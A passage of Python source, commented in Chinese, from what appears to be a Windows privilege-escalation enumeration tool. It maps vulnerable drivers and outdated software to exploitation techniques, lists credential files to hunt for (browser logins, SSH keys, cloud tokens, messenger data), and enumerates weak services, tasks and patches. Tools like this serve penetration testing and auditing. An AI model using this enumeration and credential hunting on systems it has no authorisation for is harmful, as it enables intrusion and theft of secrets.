    "piddrv.sys": {"cve": "CVE-2022-46344", "description": "HP Support Assistant驱动(32位)",
                   "exploit": "同上", "risk": 85},
}

# 过时软件版本知识库
OUTDATED_SOFTWARE_KB: Dict[str, Dict[str, Any]] = {
    "Java": {"vulnerable_versions": ["1.6", "1.7", "1.8.0_201", "11.0.1"],
             "exploit": "利用已知Java沙箱逃逸漏洞或恶意Applet", "risk": 60},
    "Python": {"vulnerable_versions": ["2.7.0", "3.5", "3.6.0"],
               "exploit": "利用Python DLL劫持或已知库漏洞", "risk": 40},
    "Apache": {"vulnerable_versions": ["2.2", "2.4.0", "2.4.49"],
               "exploit": "利用CVE-2021-41773/CVE-2021-42013路径穿越", "risk": 70},
    "MySQL": {"vulnerable_versions": ["5.5", "5.6.0", "5.7.0"],
              "exploit": "利用MySQL UDF提权或已知漏洞", "risk": 65},
    "PostgreSQL": {"vulnerable_versions": ["9.3", "9.4", "9.5.0"],
                   "exploit": "利用PostgreSQL COPY FROM PROGRAM或扩展提权", "risk": 65},
    "Microsoft SQL Server": {"vulnerable_versions": ["2008", "2012", "2014"],
                             "exploit": "利用xp_cmdshell或CLR程序集提权", "risk": 70},
    "VMware": {"vulnerable_versions": ["12.0", "14.0", "15.0"],
               "exploit": "利用VMware Escape漏洞从Guest逃逸到Host", "risk": 85},
    "VirtualBox": {"vulnerable_versions": ["5.0", "5.1", "5.2.0"],
                   "exploit": "利用VirtualBox 3D加速或共享文件夹漏洞逃逸", "risk": 80},
    "TeamViewer": {"vulnerable_versions": ["8", "9", "10", "11", "12.0"],
                   "exploit": "利用TeamViewer未引用服务路径或DLL劫持", "risk": 65},
    "AnyDesk": {"vulnerable_versions": ["2.0", "3.0", "4.0"],
                "exploit": "利用AnyDesk服务权限配置错误", "risk": 60},
    "Notepad++": {"vulnerable_versions": ["6.0", "7.0", "7.5"],
                  "exploit": "利用Notepad++插件DLL劫持", "risk": 50},
    "7-Zip": {"vulnerable_versions": ["9.20", "15.0", "16.0"],
              "exploit": "利用7-Zip DLL劫持或已知漏洞", "risk": 45},
    "WinRAR": {"vulnerable_versions": ["3.0", "4.0", "5.0"],
               "exploit": "利用WinRAR ACE漏洞(CVE-2018-20250)或DLL劫持", "risk": 55},
    "Microsoft Office": {"vulnerable_versions": ["2007", "2010", "2013"],
                         "exploit": "利用Office宏或已知OLE/公式编辑器漏洞", "risk": 60},
    "Adobe Reader": {"vulnerable_versions": ["9", "10", "11.0"],
                     "exploit": "利用Adobe Reader JavaScript引擎漏洞", "risk": 60},
    "Google Chrome": {"vulnerable_versions": ["70", "80", "90"],
                      "exploit": "利用Chrome沙箱逃逸漏洞", "risk": 50},
    "Mozilla Firefox": {"vulnerable_versions": ["60", "70", "80"],
                        "exploit": "利用Firefox已知漏洞", "risk": 45},
    "Putty": {"vulnerable_versions": ["0.60", "0.65", "0.70"],
              "exploit": "利用Putty DLL劫持或已知漏洞", "risk": 40},
    "FileZilla": {"vulnerable_versions": ["3.0", "3.10", "3.20"],
                  "exploit": "利用FileZilla保存的明文凭据", "risk": 55},
    "Wireshark": {"vulnerable_versions": ["1.0", "2.0", "2.6"],
                  "exploit": "利用Wireshark Npcap驱动漏洞或DLL劫持", "risk": 50},
    "Npcap": {"vulnerable_versions": ["0.90", "0.95", "0.9980"],
              "exploit": "利用Npcap驱动漏洞实现内核级代码执行", "risk": 75},
    "WinPcap": {"vulnerable_versions": ["4.0", "4.1.0"],
                "exploit": "利用WinPcap驱动漏洞实现内核级代码执行", "risk": 75},
    "OpenVPN": {"vulnerable_versions": ["2.3", "2.4.0"],
                "exploit": "利用OpenVPN TAP驱动漏洞或配置错误", "risk": 60},
    "Docker Desktop": {"vulnerable_versions": ["2.0", "3.0", "4.0"],
                       "exploit": "利用Docker Desktop服务权限配置错误", "risk": 65},
}

# 敏感凭据文件搜索模式
CREDENTIAL_FILE_PATTERNS: List[str] = [
    "unattend.xml", "unattended.xml", "sysprep.xml", "sysprep.inf",
    "web.config", "app.config", "applicationHost.config",
    ".aws\\credentials", ".azure\\accessTokens.json",
    ".ssh\\id_rsa", ".ssh\\id_dsa", ".ssh\\id_ecdsa", ".ssh\\id_ed25519",
    ".docker\\config.json", ".kube\\config", ".git-credentials", ".gitconfig",
    ".npmrc", ".pypirc", "terraform.tfstate", "terraform.tfvars",
    ".env", ".env.local", ".env.production", "credentials.xml",
    "rdp\\default.rdp", "mRemoteNG\\confCons.xml",
    "KeePass\\KeePass.config.xml", "FileZilla\\recentservers.xml",
    "FileZilla\\sitemanager.xml", "WinSCP.ini", "wcx_ftp.ini",
    "MobaXterm\\MobaXterm.ini", "Xshell\\Sessions", "SecureCRT\\Config",
    "VNC\\ultravnc.ini", "VNC\\tightvnc.ini", "VNC\\realvnc.ini",
    "TeamViewer\\TeamViewer*_Logfile.log", "AnyDesk\\connection_trace.txt",
    "PowerShell\\PSReadline\\ConsoleHost_history.txt",
    "WindowsPowerShell\\PSReadline\\ConsoleHost_history.txt",
    "Microsoft\\Credentials", "Microsoft\\Protect", "Microsoft\\Vault",
    "Mozilla\\Firefox\\Profiles",
    "Google\\Chrome\\User Data\\Default\\Login Data",
    "Microsoft\\Edge\\User Data\\Default\\Login Data",
    "Opera Software\\Opera Stable\\Login Data",
    "BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
    "Discord\\Local Storage\\leveldb", "Slack\\Local Storage\\leveldb",
    "Telegram Desktop\\tdata", "Signal\\config.json",
    "Microsoft\\OneDrive\\settings", "Dropbox\\info.json",
    "Google\\Drive\\sync_config.db",
]

# DLL劫持候选路径
DLL_HIJACK_CANDIDATE_PATHS: List[str] = [
    "C:\\Windows\\Temp", "C:\\Windows\\System32\\spool\\drivers\\color",
    "C:\\Windows\\System32\\Tasks", "C:\\Windows\\Tasks",
    "C:\\Windows\\tracing", "C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys",
    "C:\\Program Files", "C:\\Program Files (x86)", "C:\\ProgramData",
    "C:\\Users\\Public", "C:\\Python27", "C:\\Python310", "C:\\Python311",
    "C:\\Python312", "C:\\Perl", "C:\\Ruby", "C:\\xampp", "C:\\wamp64",
    "C:\\OpenSSL", "C:\\OpenSSL-Win64", "C:\\Strawberry",
    "C:\\cygwin64", "C:\\msys64", "C:\\mingw64",
    "C:\\Program Files\\Common Files", "C:\\Program Files (x86)\\Common Files",
]


# =============================================================================
# 辅助函数
# =============================================================================

def _check_file_writable(file_path: str) -> bool:
    """检查文件是否可写（非破坏性）

    Args:
        file_path: 文件路径

    Returns:
        是否可写
    """
    try:
        if os.path.exists(file_path):
            if os.access(file_path, os.W_OK):
                return True
            try:
                with open(file_path, "a"):
                    pass
                return True
            except (IOError, OSError, PermissionError):
                return False
        else:
            parent_dir = os.path.dirname(file_path)
            return os.path.exists(parent_dir) and os.access(parent_dir, os.W_OK)
    except Exception:
        return False


def _check_directory_writable(dir_path: str) -> bool:
    """检查目录是否可写

    Args:
        dir_path: 目录路径

    Returns:
        是否可写
    """
    try:
        if not os.path.exists(dir_path):
            return False
        test_file = os.path.join(dir_path, ".kunlun_write_test")
        try:
            with open(test_file, "w") as f:
                f.write("test")
            os.remove(test_file)
            return True
        except (IOError, OSError, PermissionError):
            return False
    except Exception:
        return False


def _run_powershell(script: str, timeout: float = 30.0) -> str:
    """执行PowerShell脚本并返回输出

    Args:
        script: PowerShell脚本内容
        timeout: 超时时间（秒）

    Returns:
        命令输出
    """
    try:
        proc = subprocess.run(
            ["powershell.exe", "-NoProfile", "-NonInteractive",
             "-ExecutionPolicy", "Bypass", "-Command", script],
            capture_output=True, text=True, timeout=timeout,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
        )
        return proc.stdout.strip()
    except subprocess.TimeoutExpired:
        logger.warning(f"PowerShell命令超时: {script[:100]}...")
        return ""
    except Exception as e:
        logger.debug(f"PowerShell执行失败: {e}")
        return ""


def _run_cmd(command: str, timeout: float = 15.0) -> str:
    """执行CMD命令并返回输出

    Args:
        command: CMD命令
        timeout: 超时时间（秒）

    Returns:
        命令输出
    """
    try:
        proc = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=timeout,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
        )
        return proc.stdout.strip()
    except subprocess.TimeoutExpired:
        logger.warning(f"CMD命令超时: {command[:100]}...")
        return ""
    except Exception as e:
        logger.debug(f"CMD执行失败: {e}")
        return ""


def _get_windows_directory() -> str:
    """获取Windows目录路径"""
    buf = ctypes.create_unicode_buffer(260)
    ctypes.windll.kernel32.GetWindowsDirectoryW(buf, 260)
    return buf.value


def _get_system_directory() -> str:
    """获取System32目录路径"""
    buf = ctypes.create_unicode_buffer(260)
    ctypes.windll.kernel32.GetSystemDirectoryW(buf, 260)
    return buf.value


# =============================================================================
# 收集器实现
# =============================================================================

class OSInfoCollector:
    """操作系统信息收集器

    收集Windows版本、构建号、体系结构、安装日期、启动时间、
    虚拟机检测等信息。所有操作均为只读。
    """

    def __init__(self) -> None:
        self._os_info = OSInfo()

    async def collect(self) -> OSInfo:
        """异步收集操作系统信息

        Returns:
            OSInfo: 操作系统信息对象
        """
        tasks = [
            self._collect_basic_info(),
            self._collect_install_date(),
            self._collect_boot_time(),
            self._collect_vm_detection(),
        ]
        await asyncio.gather(*tasks, return_exceptions=True)
        return self._os_info

    async def _collect_basic_info(self) -> None:
        """收集基本系统信息"""
        try:
            self._os_info.computer_name = platform.node()
            self._os_info.os_name = platform.system()
            self._os_info.architecture = platform.machine()
            self._os_info.system_directory = _get_system_directory()
            self._os_info.windows_directory = _get_windows_directory()

            try:
                uname = platform.uname()
                self._os_info.version = uname.version
            except Exception:
                pass

            try:
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion",
                    0, winreg.KEY_READ | KEY_WOW64_64KEY,
                )
                try:
                    self._os_info.build_number = str(
                        winreg.QueryValueEx(key, "CurrentBuildNumber")[0])
                except OSError:
                    pass
                try:
                    self._os_info.edition = str(
                        winreg.QueryValueEx(key, "EditionID")[0])
                except OSError:
                    pass
                try:
                    self._os_info.product_name = str(
                        winreg.QueryValueEx(key, "ProductName")[0])
                except OSError:
                    pass
                try:
                    self._os_info.registered_owner = str(
                        winreg.QueryValueEx(key, "RegisteredOwner")[0])
                except OSError:
                    pass
                winreg.CloseKey(key)
            except OSError:
                pass

            try:
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"SYSTEM\CurrentControlSet\Control\TimeZoneInformation",
                    0, winreg.KEY_READ,
                )
                try:
                    self._os_info.timezone = str(
                        winreg.QueryValueEx(key, "TimeZoneKeyName")[0])
                except OSError:
                    pass
                winreg.CloseKey(key)
            except OSError:
                pass

            try:
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                    0, winreg.KEY_READ,
                )
                try:
                    self._os_info.domain = str(
                        winreg.QueryValueEx(key, "Domain")[0])
                except OSError:
                    pass
                winreg.CloseKey(key)
            except OSError:
                pass

        except Exception as e:
            logger.debug(f"基本系统信息收集失败: {e}")

    async def _collect_install_date(self) -> None:
        """收集系统安装日期"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion",
                0, winreg.KEY_READ | KEY_WOW64_64KEY,
            )
            try:
                install_date_val = winreg.QueryValueEx(key, "InstallDate")[0]
                if isinstance(install_date_val, int) and install_date_val > 0:
                    dt = datetime.fromtimestamp(install_date_val)
                    self._os_info.install_date = dt.strftime("%Y-%m-%d %H:%M:%S")
            except OSError:
                pass
            winreg.CloseKey(key)
        except Exception as e:
            logger.debug(f"安装日期收集失败: {e}")

    async def _collect_boot_time(self) -> None:
        """收集系统启动时间"""
        try:
            output = _run_cmd("systeminfo | find \"System Boot Time\"", timeout=15.0)
            if output:
                parts = output.split(":", 1)
                if len(parts) > 1:
                    self._os_info.last_boot_time = parts[1].strip()
        except Exception as e:
            logger.debug(f"启动时间收集失败: {e}")

    async def _collect_vm_detection(self) -> None:
        """虚拟机检测"""
        try:
            vm_indicators: Dict[str, List[str]] = defaultdict(list)

            output = _run_cmd("systeminfo | findstr /i \"System Manufacturer System Model\"", timeout=10.0)
            output_lower = output.lower()
            vm_manufacturers = {
                "vmware": "VMware", "virtualbox": "VirtualBox",
                "qemu": "QEMU/KVM", "xen": "Xen", "microsoft corporation": "Hyper-V",
                "innotek": "VirtualBox", "oracle": "VirtualBox",
            }
            for keyword, vm_name in vm_manufacturers.items():
                if keyword in output_lower:
                    vm_indicators[vm_name].append(f"制造商/型号匹配: {keyword}")

            try:
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"SYSTEM\CurrentControlSet\Services\Disk\Enum",
                    0, winreg.KEY_READ,
                )
                try:
                    enum_val = str(winreg.QueryValueEx(key, "0")[0]).lower()
                    for keyword, vm_name in vm_manufacturers.items():
                        if keyword in enum_val:
                            vm_indicators[vm_name].append(f"磁盘枚举匹配: {keyword}")
                except OSError:
                    pass
                winreg.CloseKey(key)
            except OSError:
                pass

            vm_services = {
                "VMTools": "VMware", "VMware Physical Disk Helper Service": "VMware",
                "VBoxService": "VirtualBox", "VBoxGuest": "VirtualBox",
                "vmicheartbeat": "Hyper-V", "vmicvss": "Hyper-V",
                "vmicrdv": "Hyper-V", "vmicshutdown": "Hyper-V",
                "LxssManager": "WSL/Docker",
            }
            output = _run_powershell("Get-Service | Select-Object -ExpandProperty Name", timeout=10.0)
            output_lower = output.lower()
            for svc_name, vm_name in vm_services.items():
                if svc_name.lower() in output_lower:
                    vm_indicators[vm_name].append(f"服务存在: {svc_name}")

            vm_processes = {
                "vmtoolsd": "VMware", "vmwaretray": "VMware",
                "vboxservice": "VirtualBox", "vboxtray": "VirtualBox",
                "vmsrvc": "Hyper-V",
            }
            output = _run_cmd("tasklist", timeout=10.0).lower()
            for proc_name, vm_name in vm_processes.items():
                if proc_name in output:
                    vm_indicators[vm_name].append(f"进程存在: {proc_name}")

            vm_drivers = {
                "vm3dmp": "VMware", "vmmouse": "VMware", "vmci": "VMware",
                "vboxguest": "VirtualBox", "vboxsf": "VirtualBox",
                "vmbus": "Hyper-V", "storvsc": "Hyper-V",
            }
            output = _run_powershell(
                "Get-WmiObject Win32_SystemDriver | Select-Object Name,PathName", timeout=10.0)
            output_lower = output.lower()
            for drv_name, vm_name in vm_drivers.items():
                if drv_name in output_lower:
                    vm_indicators[vm_name].append(f"驱动存在: {drv_name}")

            if vm_indicators:
                self._os_info.is_virtual_machine = True
                primary_vm = max(vm_indicators.items(), key=lambda x: len(x[1]))
                self._os_info.vm_type = primary_vm[0]
                self._os_info.vm_details = dict(vm_indicators)

        except Exception as e:
            logger.debug(f"VM检测失败: {e}")


class UserInfoCollector:
    """用户与权限信息收集器

    收集当前用户信息、SID、组成员关系、令牌权限、本地用户枚举等。
    所有操作均为只读。
    """

    def __init__(self) -> None:
        self._user_info = UserInfo()

    async def collect(self) -> UserInfo:
        """异步收集用户与权限信息

        Returns:
            UserInfo: 用户与权限信息对象
        """
        tasks = [
            self._collect_current_user(),
            self._collect_token_privileges(),
            self._collect_local_users(),
            self._collect_uac_status(),
        ]
        await asyncio.gather(*tasks, return_exceptions=True)
        return self._user_info

    async def _collect_current_user(self) -> None:
        """收集当前用户信息"""
        try:
            self._user_info.current_user = os.environ.get("USERNAME", "")
            self._user_info.current_user_domain = os.environ.get("USERDOMAIN", "")

            output = _run_cmd("whoami /user", timeout=5.0)
            if output:
                for line in output.split("\n"):
                    if "S-1-" in line:
                        self._user_info.current_user_sid = line.strip().split()[-1]
                        break

            output = _run_cmd("whoami /groups", timeout=5.0)
            if output:
                for line in output.split("\n"):
                    line_stripped = line.strip()
                    if "Mandatory Label" in line_stripped:
                        for rid, level_name in INTEGRITY_LEVEL_MAP.items():
                            if level_name in line_stripped:
                                self._user_info.integrity_level = level_name
                                break
                    elif "BUILTIN\\Administrators" in line_stripped:
                        if "Enabled" in line_stripped or "Mandatory" in line_stripped:
                            self._user_info.is_admin = True
                    elif "NT AUTHORITY\\SYSTEM" in line_stripped:
                        self._user_info.is_system = True
                    elif line_stripped and "\\" in line_stripped:
                        group_name = line_stripped.split("\\")[-1].strip()
                        if group_name and group_name not in ("User", "Everyone",
                                                              "Authenticated Users",
                                                              "INTERACTIVE", "CONSOLE LOGON",
                                                              "LOCAL", "This Organization"):
                            if "NT AUTHORITY" in line_stripped or "BUILTIN" in line_stripped:
                                self._user_info.local_groups.append(group_name)
                            elif self._user_info.current_user_domain:
                                self._user_info.domain_groups.append(group_name)

            output = _run_cmd("whoami /priv", timeout=5.0)
            if output:
                for line in output.split("\n"):
                    if "Enabled" in line:
                        for priv_name in KNOWN_PRIVILEGES:
                            if priv_name in line:
                                self._user_info.token_privileges[priv_name] = "Enabled"
                                break
                    elif "Disabled" in line:
                        for priv_name in KNOWN_PRIVILEGES:
                            if priv_name in line:
                                self._user_info.token_privileges[priv_name] = "Disabled"
                                break

            self._user_info.critical_privileges = {
                k: v for k, v in self._user_info.token_privileges.items()
                if k in PRIVESC_CRITICAL_PRIVILEGES
            }

            try:
                import ctypes.wintypes
                advapi32 = ctypes.windll.advapi32
                kernel32 = ctypes.windll.kernel32

                token_handle = ctypes.wintypes.HANDLE()
                if advapi32.OpenProcessToken(
                    kernel32.GetCurrentProcess(), TOKEN_QUERY,
                    ctypes.byref(token_handle),
                ):
                    elevation_type = ctypes.c_uint32()
                    size = ctypes.c_uint32()
                    if advapi32.GetTokenInformation(
                        token_handle, 18, ctypes.byref(elevation_type),
                        ctypes.sizeof(elevation_type), ctypes.byref(size),
                    ):
                        self._user_info.is_elevated = (elevation_type.value == 2)
                    kernel32.CloseHandle(token_handle)
            except Exception:
                pass

        except Exception as e:
            logger.debug(f"当前用户信息收集失败: {e}")

    async def _collect_token_privileges(self) -> None:
        """收集令牌权限详细信息"""
        pass

    async def _collect_local_users(self) -> None:
        """枚举本地用户"""
        try:
            output = _run_cmd("net user", timeout=10.0)
            if output:
                lines = output.split("\n")
                in_user_list = False
                for line in lines:
                    line_stripped = line.strip()
                    if "---" in line_stripped:
                        in_user_list = True
                        continue
                    if in_user_list and line_stripped and "命令成功完成" not in line_stripped:
                        for user_name in line_stripped.split():
                            if user_name and user_name not in ("Administrator", "Guest",
                                                                "DefaultAccount", "WDAGUtilityAccount"):
                                self._user_info.local_users.append({
                                    "username": user_name,
                                    "sid": "",
                                    "is_enabled": True,
                                })

            output = _run_cmd("net localgroup Administrators", timeout=10.0)
            if output:
                lines = output.split("\n")
                in_member_list = False
                for line in lines:
                    line_stripped = line.strip()
                    if "---" in line_stripped:
                        in_member_list = True
                        continue
                    if in_member_list and line_stripped and "命令成功完成" not in line_stripped:
                        self._user_info.local_administrators.append(line_stripped)

        except Exception as e:
            logger.debug(f"本地用户枚举失败: {e}")

    async def _collect_uac_status(self) -> None:
        """收集UAC状态"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
                0, winreg.KEY_READ | KEY_WOW64_64KEY,
            )
            try:
                self._user_info.uac_enabled = bool(
                    winreg.QueryValueEx(key, "EnableLUA")[0])
            except OSError:
                pass
            try:
                self._user_info.uac_level = int(
                    winreg.QueryValueEx(key, "ConsentPromptBehaviorAdmin")[0])
            except OSError:
                pass
            winreg.CloseKey(key)
        except Exception as e:
            logger.debug(f"UAC状态收集失败: {e}")


class PatchCollector:
    """补丁与CVE漏洞对比收集器

    枚举已安装系统补丁，与内置CVE知识库对比，输出缺失补丁对应的CVE编号与风险说明。
    """

    def __init__(self) -> None:
        self._patch_info = PatchInfo()

    async def collect(self) -> PatchInfo:
        """异步收集补丁信息并对比CVE知识库

        Returns:
            PatchInfo: 补丁信息对象
        """
        await self._collect_installed_patches()
        await self._compare_cve_knowledge_base()
        return self._patch_info

    async def _collect_installed_patches(self) -> None:
        """枚举已安装补丁"""
        try:
            output = _run_cmd("wmic qfe get HotFixID", timeout=15.0)
            if output:
                for line in output.split("\n"):
                    line_stripped = line.strip()
                    if line_stripped.startswith("KB"):
                        self._patch_info.installed_patches.append(line_stripped)

            self._patch_info.total_patches = len(self._patch_info.installed_patches)

        except Exception as e:
            logger.debug(f"补丁枚举失败: {e}")

    async def _compare_cve_knowledge_base(self) -> None:
        """与CVE知识库对比"""
        try:
            installed_set = set(self._patch_info.installed_patches)

            for cve_id, cve_info in CVE_KNOWLEDGE_BASE.items():
                patch_kbs = cve_info.get("patch_kb", [])
                if not patch_kbs:
                    continue

                is_patched = any(kb in installed_set for kb in patch_kbs)

                if not is_patched:
                    finding: Dict[str, Any] = {
                        "cve_id": cve_id,
                        "title": cve_info.get("title", ""),
                        "description": cve_info.get("description", ""),
                        "severity": cve_info.get("severity", ""),
                        "cvss": cve_info.get("cvss", 0),
                        "missing_patches": [kb for kb in patch_kbs if kb not in installed_set],
                        "exploit_method": cve_info.get("exploit_method", ""),
                        "exploit_command": cve_info.get("exploit_command", ""),
                        "expected_result": cve_info.get("expected_result", ""),
                        "risk_note": cve_info.get("risk_note", ""),
                        "reference": cve_info.get("reference", ""),
                        "risk_score": cve_info.get("risk_score", 0),
                    }
                    self._patch_info.cve_findings.append(finding)
                    self._patch_info.missing_patches.extend(
                        kb for kb in patch_kbs if kb not in installed_set)

            self._patch_info.missing_patches = list(set(self._patch_info.missing_patches))
            self._patch_info.cve_findings.sort(
                key=lambda x: x.get("risk_score", 0), reverse=True)

        except Exception as e:
            logger.debug(f"CVE知识库对比失败: {e}")


class ServiceCollector:
    """服务枚举收集器

    重点关注:
    - 启动权限配置错误（普通用户可修改服务二进制路径）
    - 未引号服务路径（路径中含空格且未加双引号）
    - 以SYSTEM运行但二进制对普通用户可写的服务
    - 第三方驱动与已知漏洞驱动对比
    """

    def __init__(self) -> None:
        self._service_result = ServiceEnumResult()

    async def collect(self) -> ServiceEnumResult:
        """异步枚举服务信息

        Returns:
            ServiceEnumResult: 服务枚举结果
        """
        await self._enumerate_services()
        await self._check_vulnerable_drivers()
        return self._service_result

    async def _enumerate_services(self) -> None:
        """枚举所有服务"""
        try:
            ps_script = """
Get-WmiObject Win32_Service | ForEach-Object {
    $name = $_.Name
    $display = $_.DisplayName
    $path = $_.PathName
    $startMode = $_.StartMode
    $startName = $_.StartName
    $state = $_.State
    "$name||$display||$path||$startMode||$startName||$state"
}
"""
            output = _run_powershell(ps_script, timeout=30.0)
            if not output:
                return

            for line in output.split("\n"):
                line_stripped = line.strip()
                if not line_stripped or "||" not in line_stripped:
                    continue

                parts = line_stripped.split("||", 5)
                if len(parts) < 6:
                    continue

                name, display_name, binary_path, start_mode, start_name, state = parts
                self._service_result.total_services += 1

                svc_info = ServiceInfo(
                    name=name.strip(),
                    display_name=display_name.strip(),
                    binary_path=binary_path.strip(),
                    start_type=start_mode.strip(),
                    start_name=start_name.strip(),
                    state=state.strip(),
                )

                if binary_path and self._is_unquoted_path(binary_path):
                    svc_info.is_unquoted_path = True
                    svc_info.risk_description = "未引号服务路径 - 可被利用进行DLL劫持或二进制替换"
                    self._service_result.unquoted_path_services.append(svc_info)

                if binary_path and start_name and "LocalSystem" in start_name:
                    exe_path = self._extract_exe_path(binary_path)
                    if exe_path and _check_file_writable(exe_path):
                        svc_info.is_binary_writable = True
                        svc_info.risk_description = (
                            f"以SYSTEM运行且二进制可写: {exe_path}")
                        self._service_result.writable_binary_services.append(svc_info)

                if binary_path and start_name and "LocalSystem" in start_name:
                    exe_path = self._extract_exe_path(binary_path)
                    if exe_path:
                        exe_dir = os.path.dirname(exe_path)
                        if _check_directory_writable(exe_dir):
                            svc_info.is_service_writable = True
                            if not svc_info.risk_description:
                                svc_info.risk_description = (
                                    f"以SYSTEM运行且服务目录可写: {exe_dir}")
                            if svc_info not in self._service_result.misconfigured_services:
                                self._service_result.misconfigured_services.append(svc_info)

        except Exception as e:
            logger.debug(f"服务枚举失败: {e}")

    @staticmethod
    def _is_unquoted_path(binary_path: str) -> bool:
        """检测未引号服务路径

        Args:
            binary_path: 服务二进制路径

        Returns:
            是否为未引号路径
        """
        if not binary_path:
            return False
        path_stripped = binary_path.strip().strip('"')
        if " " in path_stripped and not binary_path.strip().startswith('"'):
            if path_stripped.lower().endswith(".exe") or path_stripped.lower().endswith(".dll"):
                return True
        return False

    @staticmethod
    def _extract_exe_path(binary_path: str) -> str:
        """从服务路径中提取可执行文件路径

        Args:
            binary_path: 服务二进制路径

        Returns:
            可执行文件路径
        """
        if not binary_path:
            return ""
        path_stripped = binary_path.strip().strip('"')
        if path_stripped.lower().endswith(".exe"):
            return path_stripped
        parts = path_stripped.split()
        for part in parts:
            if part.lower().endswith(".exe"):
                return part
        return path_stripped

    async def _check_vulnerable_drivers(self) -> None:
        """检查已知漏洞驱动"""
        try:
            ps_script = """
Get-WmiObject Win32_SystemDriver | ForEach-Object {
    "$($_.Name)||$($_.PathName)"
}
"""
            output = _run_powershell(ps_script, timeout=20.0)
            if not output:
                return

            for line in output.split("\n"):
                line_stripped = line.strip()
                if not line_stripped:
                    continue
                parts = line_stripped.split("||", 1)
                if len(parts) < 2:
                    continue
                drv_name, drv_path = parts[0].strip(), parts[1].strip()

                if drv_path and not drv_path.lower().startswith("c:\\windows\\system32\\drivers\\"):
                    self._service_result.third_party_drivers.append(drv_name)

                for vuln_drv_name, vuln_info in VULNERABLE_DRIVERS.items():
                    if drv_name.lower() == vuln_drv_name.lower():
                        finding: Dict[str, Any] = {
                            "driver_name": drv_name,
                            "driver_path": drv_path,
                            "cve": vuln_info.get("cve", ""),
                            "description": vuln_info.get("description", ""),
                            "exploit": vuln_info.get("exploit", ""),
                            "risk": vuln_info.get("risk", 0),
                        }
                        self._service_result.vulnerable_drivers.append(finding)
                        break

        except Exception as e:
            logger.debug(f"漏洞驱动检查失败: {e}")


class AutostartCollector:
    """计划任务与自启动收集器

    重点关注:
    - 以SYSTEM运行且执行脚本对当前用户可写的计划任务
    - 触发器包含"用户登录时"或"系统启动时"的任务
    - Run/RunOnce自启动项
    - AlwaysInstallElevated注册表键
    - UAC配置
    """

    def __init__(self) -> None:
        self._autostart_info = AutostartInfo()

    async def collect(self) -> AutostartInfo:
        """异步收集计划任务与自启动信息

        Returns:
            AutostartInfo: 自启动信息对象
        """
        tasks = [
            self._collect_scheduled_tasks(),
            self._collect_run_keys(),
            self._collect_always_install_elevated(),
            self._collect_uac_config(),
            self._collect_startup_folder(),
        ]
        await asyncio.gather(*tasks, return_exceptions=True)
        return self._autostart_info

    async def _collect_scheduled_tasks(self) -> None:
        """枚举计划任务"""
        try:
            ps_script = """
Get-ScheduledTask | ForEach-Object {
    $name = $_.TaskName
    $path = $_.TaskPath
    $state = $_.State
    $principal = "$($_.Principal.UserId)"
    $triggers = ($_.Triggers | ForEach-Object { $_.CimClass.CimClassName }) -join ';'
    $actions = ($_.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments)" }) -join ';'
    "$name||$path||$state||$principal||$triggers||$actions"
}
"""
            output = _run_powershell(ps_script, timeout=30.0)
            if not output:
                return

            for line in output.split("\n"):
                line_stripped = line.strip()
                if not line_stripped or "||" not in line_stripped:
                    continue
                parts = line_stripped.split("||", 5)
                if len(parts) < 6:
                    continue

                name, path, state, principal, triggers_str, actions_str = parts
                task_info = ScheduledTaskInfo(
                    name=name.strip(),
                    path=path.strip(),
                    state=state.strip(),
                    principal=principal.strip(),
                    triggers=triggers_str.split(";") if triggers_str else [],
                    actions=actions_str.split(";") if actions_str else [],
                )

                principal_lower = principal.lower()
                if "system" in principal_lower or "nt authority" in principal_lower:
                    task_info.is_system_task = True

                    for action in task_info.actions:
                        action_stripped = action.strip().strip('"')
                        if action_stripped and (
                            action_stripped.lower().endswith(".ps1") or
                            action_stripped.lower().endswith(".bat") or
                            action_stripped.lower().endswith(".cmd") or
                            action_stripped.lower().endswith(".vbs") or
                            action_stripped.lower().endswith(".js")
                        ):
                            if _check_file_writable(action_stripped):
                                task_info.is_script_writable = True
                                task_info.risk_description = (
                                    f"以SYSTEM运行且脚本可写: {action_stripped}")
                                break

                triggers_lower = triggers_str.lower()
                if ("logon" in triggers_lower or "boot" in triggers_lower or
                        "startup" in triggers_lower):
                    if not task_info.risk_description:
                        task_info.risk_description = "触发器包含登录/启动时执行"

                self._autostart_info.scheduled_tasks.append(task_info)

        except Exception as e:
            logger.debug(f"计划任务枚举失败: {e}")

    async def _collect_run_keys(self) -> None:
        """收集Run/RunOnce注册表键"""
        run_key_paths = [
            (winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
             KEY_WOW64_64KEY, "HKLM\\Run"),
            (winreg.HKEY_LOCAL_MACHINE,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
             KEY_WOW64_64KEY, "HKLM\\RunOnce"),
            (winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
             0, "HKCU\\Run"),
            (winreg.HKEY_CURRENT_USER,
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
             0, "HKCU\\RunOnce"),
        ]

        for hkey, subkey, access, label in run_key_paths:
            try:
                key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_READ | access)
                try:
                    i = 0
                    while True:
                        try:
                            value_name, value_data, _ = winreg.EnumValue(key, i)
                            entry = {"path": label, "name": value_name, "command": str(value_data)}
                            if "RunOnce" in label:
                                self._autostart_info.runonce_keys.append(entry)
                            else:
